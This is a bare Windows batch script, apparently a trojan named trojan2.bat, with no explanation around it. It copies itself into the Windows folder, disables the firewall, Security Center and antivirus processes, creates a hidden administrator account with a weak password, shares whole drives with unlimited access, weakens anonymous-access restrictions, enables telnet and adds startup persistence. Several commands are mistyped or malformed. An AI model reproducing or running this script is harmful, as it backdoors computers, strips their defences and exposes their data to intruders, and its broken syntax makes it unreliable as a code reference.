 @echo off

    color 0a

    cls

    IF not exist %windir%\%0 copy %0 %windir%

    netsh firewall set opmode=disable

    net stop ShareAccess

    Net stop “Security Center”

    Tskill *AV*

    NET USER admin admin123  /ADD

    NET LOCAL GROUP ADMINISTRATORS admin /ADD

    Reg ADD “HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\ SpecialAccounts \UserList” /v”admin” /t REG_DWORD/d 0 /f

    REG ADD HKLM\SYSTEM\ControlSet001\Services\Messenger /v Start /t REG_DWORD /d 2/f

    Net start messenger

    dir *.*>>Filelist.txt

    Net send 192.168.1.100 >hasil.txt

    NET SHARE system=%SYSTEMDRIVE% /UNLIMITED

    NET SHARE data1=D:\ /UNLIMITED

    NET SHARE data1=E:\ /UNLIMITED

    REG ADD HKCR\Network\SharingHandler /ve /t REG_SZ/d “”/f

    REG ADD HKLD\SYSTEM\CurrentControlSet\LSA /v forceguest /t REG_DWORD /d 0 /f

    REG ADD HKLD\SYSTEM\CurrentControlSet\LSA /v restrictanonymous /t REG_DWORD /d 0 /f

    REG ADD HKLM\SYSTEM\ControlSet001\Services\TIntSvr /v Start /t REG_DWORD /d 2/f

    Net start tIntsvr

    REG ADD HKLM\Software\Microsoft\Windows\pCurrentVersion\Run\v Eksplorer /t REG_SZ /d %windir%\trojan2.bat /f

    REG ADD HKCU\Software\Microsoft\Windows\pCurrentVersion\Run\v Eksplorer /t REG_SZ /d %windir%\trojan2.bat /f